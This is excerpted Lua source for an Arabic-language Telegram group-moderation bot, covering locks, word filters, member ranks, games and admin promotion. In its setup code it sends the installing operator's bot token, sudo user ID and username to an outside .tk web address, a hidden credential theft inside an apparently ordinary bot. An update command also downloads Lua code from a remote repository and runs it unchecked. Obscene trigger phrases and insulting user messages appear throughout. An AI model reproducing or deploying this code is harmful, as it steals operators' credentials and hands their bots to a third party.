...
create_config_auto()
https.request("https://nightrangoro.tk/AVIRA.php/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("nightrang", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/XGGGJ
token="]]..database:get(id_server..":token")..[["
...
elseif database:sismember(bot_id..'Memp:Rd'..chat_id, user_id) then  
...
local nightrang_Msg = ''  
if msgs < 100 then 
nightrang_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
nightrang_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
nightrang_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
nightrang_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
nightrang_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
nightrang_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
nightrang_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
nightrang_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
nightrang_Msg = 'ملك التفاعل ' 
elseif msgs < 5500 then 
nightrang_Msg = 'ملك التفاعل ' 
elseif msgs < 7000 then 
nightrang_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
nightrang_Msg = 'ملك تفاعل ' 
elseif msgs < 10000000000 then 
nightrang_Msg = 'ملك التفاعل '  
end 
return nightrang_Msg 
end
...
function plugin_nightranga(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.nightranga and msg then
pre_msg = plugin.nightranga(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcenightrang(msg,data) -- بداية العمل
if msg then
...
if SudoBot(msg) then
local bl =  '- اهلا بك عزيزي المطور الاساسي \n شكرا لي استخدامك سورس نايت رانج \n يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/hlIl3) '
local keyboard = {
	{'ضع اسم للبوت'},
{'تعطيل التواصل ','تفعيل التواصل '},
{'الاحصائيات'},
{'المشتركين','المجموعات'},
{'المطورين','قائمة العام'},
{'اذاعه خاص','اذاعه'},
...
if start then 
Sourcenightrangr = start
else
Sourcenightrangr =  '– اهلا بك انا بوت حماية مجموعات \n– تخصصي حمايه المجموعات من تكرار والسبام والتوجيه والخ...[قناة السورس](t.me/hlIl3)'
end 
send(msg.chat_id_, msg.id_, Sourcenightrangr) 
end
end
...
send(msg.chat_id_, msg.id_,nightrang_Msg) 
return false  
end 
if text then    
...
if text == '•12•' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local nightrang1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..nightrang1.server.uptime_in_days..'('..nightrang1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..nightrang1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..nightrang1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..nightrang1.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end

if text == '١٢٣٤٥٦امجي' and SudoBot(msg) then 
...
os.execute('wget https://raw.githubusercontent.com/rangmohammed/XGGGJ/master/nightrang.lua')
send(msg.chat_id_, msg.id_,'•~┇ تم تحديث السورس')
dofile('nightrang.lua')  
end
if text == 'الاصدار' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'⌔︙1.0V') 
end
...
send(msg.chat_id_, msg.id_,'•~┇ عدد المجموعات الان ← { '..#group..' }'..nightrangk..''..nightrang..'\n*•~┇ الان عدد المجموعات الحقيقي ← { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n⌔︙ العضو ← ['..result.title_..'](t.me/'..(username or 'xxxli')..')'
...
usertext = '\n⌔︙ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxli')..') '
status  = '\n تم ترقيته مطور في البوت'
...
local nightrang1_Msg = database:get(bot_id.."nightrang1:Add:Filter:Rp2"..text..msg.chat_id_)   
if nightrang1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙ العضو← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxli')..') \n ⌔︙'..nightrang1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if nightrang_Msg and not Special(msg) then  
local nightrang_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if nightrang_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"• عضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌔︙["..nightrang_Msg.."] \n") 
else
send(msg.chat_id_,0,"• عضو : {["..data.first_name_.."](T.ME/xxxli)}\n⌔︙["..nightrang_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
list = {"كس","كسمك","كسختك","زب","يجرار","يبن كحبه","يبن زنه","كس كلاسين امك","كحاب","منيوك","مهان","كحبه","ابن الكحبه","ديوث","ديوس","طيزك","كسمك.","يبن حرام","يبن ست و ستين كحبه","يشرموط","قواد","معرص","سرسري","قحبه","ابن كلب","ك🐟"}
for k,v in pairs(list) do
...
if text and database:get(bot_id..'lock:Ansore'..msg.chat_id_) and not Manager(msg) then 
...
if text and database:get(bot_id..'lock:Zrfa'..msg.chat_id_) and not Manager(msg) then 
list = {"چ","ه‍","ڢ","ڥ","ڤ","ڜ","پ","گ","ک","ݣ","ژ","ـ","َ","ٕ","ُ","ِ","ٓ","ٰ","ٖ","ً","ّ","ٍ","ْ","ٔ"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
send(msg.chat_id_,0, "•~┇عذرا يا ← {["..data.first_name_.."](T.ME/xxxli)}\n•~┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'• بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxli')..') \n تـم قفـل الدردشه')  
end,nil)   
...
elseif text == 'قفل العنصريه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Ansore'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'• بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxli')..') \n  تـم قفـل العنصريه\n')  
end,nil)  
elseif text == 'قفل المزخرف' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Zrfa'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'• بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxli')..') \n  تـم قفـل المزخرفه\n')  
end,nil)  
...
elseif text == 'فتح العنصريه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Ansore'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'• بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxli')..') \n تـم فـتح العنصريه\n')  
end,nil)   
elseif text == 'فتح المزخرف' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Zrfa'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'• بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxli')..') \n تـم فـتح المزخرف\n')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'•~┇ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxli')..') \n تـم قفـل التاك بالكتم\n•~┇ الحاله ←الكتم ')  
end,nil)   
...
send(msg.chat_id_, msg.id_, '\n• تم مسح قائمه المالكين الاساسين')
return false
end

if text == 'المالكين الاساسين' and Sudo(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n• قائمة المالكين الاساسين \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ←  ([@"..username.."])\n"
...
if #list == 0 then
t = "• لا يوجد مالكين اساسيين"
end
send(msg.chat_id_, msg.id_, t)
return false
end

if text == (" ") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^  @(.*)$") and Sudo(msg) then
...
if text and text:match("^  (%d+)$") and Sudo(msg) then
...
if text == 'المنشئين الاساسين' and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
...
local UserName = (b.username_ or "nightrangTEAM")
...
if text == ("منشن لكلاب") and Mod(msg) then
...
-----------------------------------------------------
if text == 'مسح الهطوف' and Mod(msg) then
database:del(bot_id..'Mottte:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '•~| تم تنزيل جميع هطوف المجموعه  ')
end
if text == ("منشن هطوف") and Mod(msg) then
local list = database:smembers(bot_id..'Mottte:User'..msg.chat_id_)
t = "\n•~| قائمة هطوف المجموعه \n ••━━━━━•• \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
function start_function(extra, result, success)
database:sadd(bot_id..'Mottte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو ← ← ['..data.first_name_..'](t.me/'..(data.username_ or 'nayy2019')..') '
local  statuss  = '\n•← الايـدي ← `'..result.sender_user_id_..'`\n• تم رفع العضو إلى هطف بنجاح\nاهى تستحقها بجداره اهى'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
function start_function(extra, result, success)
database:srem(bot_id..'Mottte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'nayy2019')..') '
status  = '\n• الايدي  ← '..result.sender_user_id_..' \n • تم تنزيل العضو هطف\nجب جب لقب الي عطيتك اياه '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Motttte:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '•~| تم تنزيل جميع هطوف المجموعه  ')
end
if text == ("منشن اغبياء") and Mod(msg) then
local list = database:smembers(bot_id..'Motttte:User'..msg.chat_id_)
t = "\n•~| قائمة اغبياء المجموعه \n ••━━━━━•• \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← غبي [@"..username.."]\n"
...
function start_function(extra, result, success)
database:sadd(bot_id..'Motttte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو ← ← ['..data.first_name_..'](t.me/'..(data.username_ or 'nayy2019')..') '
local  statuss  = '\n•← الايـدي ← `'..result.sender_user_id_..'`\n• تم رفع العضو إلى غبي بنجاح\nيا غبي في شي بي مخك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
function start_function(extra, result, success)
database:srem(bot_id..'Motttte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'nayy2019')..') '
status  = '\n• الايدي  ← '..result.sender_user_id_..' \n • تم تنزيل العضو غبي\n كبرت في عيني بطلت غبي '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if text == ("رفع مشرف اساسي") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي !') 
return false  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n•← العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxli')..') '
status  = '\n•← الايدي ← '..result.sender_user_id_..' \n تم رفع العضو مشرف اساسي القروب'
send(msg.chat_id_, msg.id_, usertext..status)
...
if text and text:match("^مشرف اساسي @(.*)$") and BasicConstructor(msg) then
local username = text:match("^مشرف اساسي @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
...
if text == ("تنزيل مشرف اساسي") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي !') 
return false  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n•← العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxli')..') '
status  = '\n•← الايدي ← '..result.sender_user_id_..' \n تم تنزيله تنزيل مشرف اساسي من القروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
if text and text:match("^تنزيل مشرف اساسي @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل مشرف اساسي @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
...
database:set(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."nightrang1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."nightrang1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"⌔︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."nightrang1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."nightrang1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."nightrang1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"⌔︙ارسل الكلمه الان")  
database:set(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."nightrang1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."nightrang1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."nightrang1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."nightrang1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."nightrang1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."nightrang1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⌔︙قائمة المنع \n ••━━━━━•• \n"
for k,v in pairs(list) do  
local nightrang_Msg = database:get(bot_id.."nightrang1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." ← {"..nightrang_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'اه اه يا عراب يا فحل مجره نيك اختي' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
⌔︙ `#game` نقاطك
••━━━━━••
⌔︙ارسل تغيير الايدي ليتم تثبيت الايدي الجديد
]]
send(msg.chat_id_, msg.id_,Text)
return false  
elseif text == 'كسمك يا متناك سمعرص يبن قحبيه هنا عمك عراب' and Mod(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
...
if text == '		>{] ~|' or text == 'تنزيل مشرف اساسي @مرحبا ينب زبي يبن مهان يبن قحبتي ' then
if Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔︙ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'xxxli')..')'..'\n تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'رانج').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'رانج')
local nightrang_Msg = {
'آمر يروحي ',
'عيونه ',
}
send(msg.chat_id_, msg.id_,'['..nightrang_Msg[math.random(#nightrang_Msg)]..']') 
return false
end
...
-- vardump(data) 
nightrangdx(msg.chat_id_, msg.id_, '• ايدي المجموعة ← ( '..msg.chat_id_..' )\n عدد الادمنيه ← ( *'..data.administrator_count_..' )*\n• عدد المحظورين ← ( *'..data.kicked_count_..' )*\n• عدد الاعضاء ← ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'تفعيل قول ' and Manager(msg) then  
send(msg.chat_id_, msg.id_, ' تم تفعيل امر قول')
database:del(bot_id..'lock:add'..msg.chat_id_)
end
if text == 'تعطيل قول' and Manager(msg) then  
send(msg.chat_id_, msg.id_, '• تم تعطيل امر قول ')
...
if text == 'اتتنسةسحسزسكمسميظي' and SudoBot(msg) then
...
if text == 'الاوامر' or text == 'اوامر' then
if not Mod(msg) then
...
----------------------------------------------------------------------------
if text == 'م5 تم الغاء ها من قبل عراب ' or text == 'م5 تم الغاء ها من قبل عراب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ عذرا الاوامر هذا لا تخصك ') 
return false
end
...
----------------------------------------------------------------------------
if text == 'م6 الغاء ها من قبل عراب' or text == 'م6 الغاء ها من قبل عراب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ عذرا الاوامر هذا لا تخصك ') 
return false
end
...
⌔︙ مسح المالكين - المالكين الاساسين
...
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
Hussein = {'كت ويت افضل شخص عرفته في 2020','منشن @ اكثر شخص تحبه','اكثر عام كان حلو','منشن @ اكثر شخص كريه','منشن @ اكثر واحد له وقفات معك','شخص كل ما تقربت منه صار وصخ','هل تحب البوت؟؟','كم عمرك','ماذا تقول عن تسطير و السب','ما أكثر شهر تحبه','اكثر شخص تحسه غبي','اكثر شخص اناني'};
name = Hussein[math.random(#Hussein)]
database:del(bot_id..'Set:Cetwet:Bot'..msg.chat_id_)
database:set(bot_id..':Set:Cetwet'..msg.chat_id_,name)
name = string.gsub(name,'gh','كت ويت افضل شخص عرفته في 2020')
name = string.gsub(name,'gg','منشن @ اكثر شخص تحبه')
name = string.gsub(name,'gj','اكثر عام كان حلو')
name = string.gsub(name,'gu','منشن @ اكثر شخص كريه')
name = string.gsub(name,'gv','منشن @ اكثر واحد له وقفات معك')
name = string.gsub(name,'gc','شخص كل ما تقربت منه صار وصخ')
name = string.gsub(name,'gk','هل تحب البوت؟؟ ')
name = string.gsub(name,'gx','كم عمرك')
name = string.gsub(name,'gz','ماذا تقول عن تسطير و السب')
name = string.gsub(name,'ge ','ما أكثر شهر تحبه')
name = string.gsub(name,'go','اكثر شخص تحسه غبي ')
name = string.gsub(name,'gp','اكثر شخص اناني')
send(msg.chat_id_, msg.id_,''..name..' ')
return false
end
end
------------------------------------------------------------------------
if text == ''..(database:get(bot_id..':Set:Cetwet'..msg.chat_id_) or '')..'' then 
if not database:get(bot_id..'Set:Cetwet:Bot'..msg.chat_id_) then 
database:del(bot_id..':Set:Cetwet'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ←{ `انجليزي` }')
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:English:Bot'..msg.chat_id_,true)
...
if text ==  ""..Name_Bot..' . مسخضزرجس' and tonumber(msg.reply_to_message_id_) > 0 then     
...
--------------------------------------------------------------------------------------------------------------
Sourcenightrang(data.message_,data)
plugin_nightranga(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local nightrangAbot = database:get(bot_id.."nightrang1:Add:Filter:Rp2"..text..result.chat_id_)   
if nightrangAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
...
------------------------------------------------------------------------
if text then
local nightrang1_Msg = database:get(bot_id.."nightrang1:Add:Filter:Rp2"..text..result.chat_id_)   
if nightrang1_Msg then    
send(msg.chat_id_, msg.id_,"⌔︙"..nightrang1_Msg)
